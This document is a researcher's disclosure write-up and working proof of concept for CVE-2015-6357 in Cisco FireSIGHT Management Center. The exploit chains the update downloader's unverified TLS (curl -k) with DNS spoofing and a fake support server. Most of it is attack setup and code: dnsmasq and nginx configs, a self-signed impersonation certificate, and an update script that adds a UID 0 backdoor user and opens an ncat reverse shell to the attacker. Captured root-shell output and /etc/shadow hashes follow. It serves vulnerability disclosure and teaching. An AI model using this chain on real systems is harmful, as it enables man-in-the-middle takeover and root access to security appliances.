# CVE-2015-6357: FirePWNER Exploit for Cisco FireSIGHT Management Center SSL Validation Vulnerability

## Introduction

On its own the [Cisco FireSIGHT Management Center Certificate Validation
Vulnerability][3] is a **medium** severity vulnerability with a **CVSS** of **5.1**.
However, this vulnerability is an example of why SSL certificate validation is so
important. In this exploit I will demonstrate how the vulnerability can be leveraged
to obtain privileged remote command execution on a Cisco FireSIGHT system. The 
exploit chains the SSL validation vulnerability with the software update process
on the Cisco FireSIGHT system to trick the target system into downloading a malicious
update and executing it to obtain a reverse shell with **root** privileges.

![AND THAT'S WHY YOU SHOULD ALWAYS VALIDATE SSL CERTIFICATES](https://i.imgflip.com/u60wm.jpg)

## The Vulnerability

The Cisco FireSIGHT Management Center appliance is used to manage Cisco
FirePOWER Intrusion Prevention Systems (IPS), also known as Sourcefire IPS.
FireSIGHT is responsible for downloading updated IPS signatures and installing
them on managed IPS devices.

The FireSIGHT Management Center allows an administrator to manually initiate an
update of the IPS rules or schedule the updates to occur daily/weekly/monthly.

When the FireSIGHT Management Center performs an update it uses the `curl` UNIX
command to perform the download from [Sourcefire Support][1]. The
invocation of the `curl` command is passed the `-k` (aka `--insecure`) option
which tells `curl` to not validate any SSL certificates presented by the server.

Here is the the `ps` output of the server downloading an update:

    admin@FIRESIGHT01:/var/sf$ ps -auxwww | grep curl
    root      8351  0.0  0.0  37396  2708 ?        S    02:02   0:00 /usr/local/bin/curl -k -o /var/sf/updates/Sourcefire_Geodb_Update-2015-08-17-002.sh https://support.sourcefire.com/auto-update/auto-dl.cgi/XX:XX:XX:XX:XX:XX:XX/Download/files/Sourcefire_Geodb_Update-2015-08-17-002.sh


FireSIGHT updates come in the form of a [makeself][2] generated shell script
that contains both UNIX Bourne shell commands as well as the binary data
to be delivered in the update. These shell update shell scripts are executed
directly on the FireSIGHT server as the local `www` user.

An attacker that is able to perform a man in the middle attack against
a FireSIGHT server can force it to connect to a spoofed version of the
[Sourcefire Support][1] web site and download a malicious update script that
will execute any command the attacker wishes on the FireSIGHT server.

The SSL Validation vulnerability enables this to occur resulting in the system
happily ignoring the attackers spoofed SSL certificate and downloading the
malicious update and executing it.

If the `curl` command were to validate the SSL certificate then it would fail
to download the malicious script and protect the FireSIGHT server from the
attacker.

This exploit demonstrates the danger of not validating the SSL certificate
by exploiting the vulnerability to gain remote command execution as the root
user.

## The Attack Scenario

The attack scenario is one where an attacker has attained the ability to man in
the middle the traffic from the FireSIGHT server to the
https://support.sourcefire.com web site. The simplest way to demonstrate this
is to set up a "compromised" DNS server that responds to queries for the domain
`support.sourcefire.com` with the IP address of a web server that the attacker
controls.

In a real attack scenario the attacker may use any number of man in the middle
techniques to acheive the same means. Such as:

* DNS cache poisioning
* ARP spoofing. e.g ettercap.

This exploit was tested against the following FireSIGHT Virtual Appliance versions:

* 5.2.0
* 5.3.0
* 5.4.0
* 5.4.1.1
* 5.4.1.2

In the PoC below the FireSIGHT server was assigned the IP address `192.168.1.99`.

The attacking host was running Kali Linux 2.0 though the set up below
should work on any Debian Linux based server. The IP address of the Kali host
in the example below is `192.168.1.1`. The Kali host is used to run the DNS server
as well as the spoofed [Sourcefire Support][1] web site.

## Set up dnsmasq

The exploit requires the ability to spoof the DNS response for
`support.sourcefire.com`. A dnsmasq server is run to provide this capability and
act as the "compromised" DNS server.

Install dnsmasq:

    root@kali# apt-get install dnsmasq

Configure dnsmasq:

    root@kali# cat << EOF > /etc/dnsmasq.d/firepnwer.conf
    address=/support.sourcefire.com/192.168.1.1
    server=8.8.8.8
    EOF

Edit the IP address on the `address` line to be the address
of the web server you will serve the updates from.

Start dnsmasq:

    root@kali# service dnsmasq start

## Set up nginx

A web server is required to serve the exploit to the FireSIGHT server when it
requests an update.

Install nginx web server:

    root@kali# apt-get install nginx

Create a self signed certificate to impersonate `support.sourcefire.com`:

    root@kali# mkdir /etc/nginx/ssl

    root@kali# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/nginx/ssl/nginx.key \
     -out /etc/nginx/ssl/nginx.crt

    Country Name (2 letter code) [AU]:AU
    State or Province Name (full name) [Some-State]:New South Wales
    Locality Name (eg, city) []:Newcastle
    Organization Name (eg, company) [Internet Widgits Pty Ltd]:FirePWNER Exploit.
    Organizational Unit Name (eg, section) []:
    Common Name (e.g. server FQDN or YOUR name) []:support.sourcefire.com
    Email Address []:

Configure nginx by replacing the contents of
`/etc/nginx/sites-available/default` with:

    server {
        listen 80 default_server;
        listen [::]:80 default_server;

        listen 443 ssl;

        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name support.sourcefire.com;
        ssl_certificate /etc/nginx/ssl/nginx.crt;
        ssl_certificate_key /etc/nginx/ssl/nginx.key;

        location / {
            try_files $uri $uri/ =404;
        }

        # rewrite requests that contain the clients license key
        location ~* /auto-update/auto-dl.cgi/[A-F0-9][A-F0-9]:.* {
            rewrite ^(/auto-update/auto-dl.cgi)/[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]/(.*)$ $1/$2;
        }

        location /auto-update {
            root /var/www/html/firepwner;
        }

    }

Start nginx:

    root@kali# service nginx start

## Setting up the exploit

The FirePWNER exploit requires two files to be served from the web server. The
first file is the update manifest which is an XML file that contains a list of
the updates available, their download location and MD5 hashes.

First you need to create some directories:

    root@kali# mkdir \
        /var/www/html/firepwner/auto-update/auto-dl.cgi/{Download/files,GetCurrent}

Then copy the exploit files into them:

    root@kali# cp sf.xml /var/www/html/firepwner/auto-update/auto-dl.cgi/GetCurrent/sf.xml
    root@kali# cp firepwner.sh \
        /var/www/html/firepwner/auto-update/auto-dl.cgi/Download/files/firepwner.sh

After copying these files you should be able to browse to
`http://192.168.1.1/auto-update/auto-dl.cgi/GetCurrent/sf.xml`

## Configure the FireSIGHT server DNS

Next, for exploit demonstration purposes, the FireSIGHT server needs to be configured to
use the "compromised" DNS server. Login to the FireSIGHT web portal and go to 
`System > Local > Configure > Management Interfaces` and set the Primary DNS server to
the IP address of the "compromised" DNS server (192.168.1.1) and save the change.

## Running the Exploit

The exploit uses the `ncat` command installed by default on the FireSIGHT
server to create a reverse shell to the Kali host. On the Kali host you need to
listen for the reverse shell connection from the FireSIGHT server:

    root@kali# ncat -v -l 4444

Then on the FireSIGHT web portal browse to `System > Updates > Rule Updates`
and select `Download new rule update from the Support Site` and click the
`Import` button. The server will then download the `sf.xml` update manifest from
the attacker's server, see that there is an update available and will
download the update and execute it as the `www` user. The update/exploit script
below takes advantage of the fact that the `www` user has a number of `sudo` commands
it can run including `useradd`. The exploit creates a new `toor` user with an
empty passwd and then uses `su` to elevate privileges and start a reverse shell
connection back to the attackers server. 

    #!/bin/sh
    # add a new UID 0 "toor" user with an empty password
    sudo useradd -o -p '$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.' -g root -c toor -u 0 -s /bin/sh \
     -d /root toor
    # su to toor and start the reverse shell
    echo | su - toor -c "/usr/local/sf/nmap/bin/ncat -e /bin/sh support.sourcefire.com 4444"
    exit 0

The exploit script may be changed to run any other desired commands. If the
script is changed then the `<md5sum>` XML tag value in `sf.xml` must be updated
with the new MD5 hash of the exploit script.

This is an example of the output you should see on the Kali host when the
exploit is successful and a remote shell on the FireSIGHT server is opened and
the `id` and `cat /etc/passwd` commands are run:

    root@kali# ncat -v -l 4444
    Ncat: Version 6.49BETA4 ( http://nmap.org/ncat )
    Ncat: Listening on :::4444
    Ncat: Listening on 0.0.0.0:4444
    Ncat: Connection from 192.168.1.99.
    Ncat: Connection from 192.168.1.99:41637.
    id
    uid=0(root) gid=0(root) groups=0(root)
    cat /etc/shadow
    root:x:11869:0:::::
    bin:*:9797:0:::::
    daemon:*:9797:0:::::
    mysql:*:9797:0:::::
    nobody:*:9797:0:::::
    sshd:*:9797:0:::::
    www:*:9797:0:::::
    sfsnort:*:9797:0:::::
    sfremediation:*:9797:0:::::
    sfrna:*:9797:0:::::
    snorty:*:9797:0:::::
    admin:$6$GCOeXpyR$Qhq6Eq5aSW8n.15RajwYrHVLud8NaN4aKEkVXC43I5m/X.ux/bgIHAplYifOaxTIxaIThqOBGmZgO5aey5tjE/:11869:0:::::
    toor:$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.:16679:0:99999:7:::

## Obtaining the Exploit

The files used in this exploit may be obtained from [github][4].

## Disclosure Timeline

- 2015-08-31 Vulnerability discovered in FireSIGHT 5.4.x and exploit developed
  by Matthew Flanagan.
- 2015-09-01 Initial contact made with Cisco PSIRT psirt@cisco.com.
- 2015-09-01 PSIRT responded asking for more information.
- 2015-09-01 Matthew Flanagan provided PSIRT with full write up and exploit of vulnerability.
- 2015-09-02 PSIRT raised FireSIGHT defect and incident PSIRT-190974966.
- 2015-09-15 Matthew Flanagan reported to Cisco PSIRT that versions 5.2.0 and 5.3.0 are also
vulnerable.
- 2015-10-16 PSIRT advised me of the CVSS score they assigned to the vulnerability.
- 2015-11-09 PSIRT assigned CVE ID CVE-2015-6357.
- 2015-11-16 [Cisco FireSIGHT Management Center Certificate Validation
  Vulnerability][3] published.
- 2015-11-16 Matthew Flanagan's findings published.

[1]: https://support.sourcefire.com "Sourcefire support"
[2]: https://github.com/megastep/makeself "makeself"
[3]: http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability"
[4]: https://github.com/mattimustang/firepwner
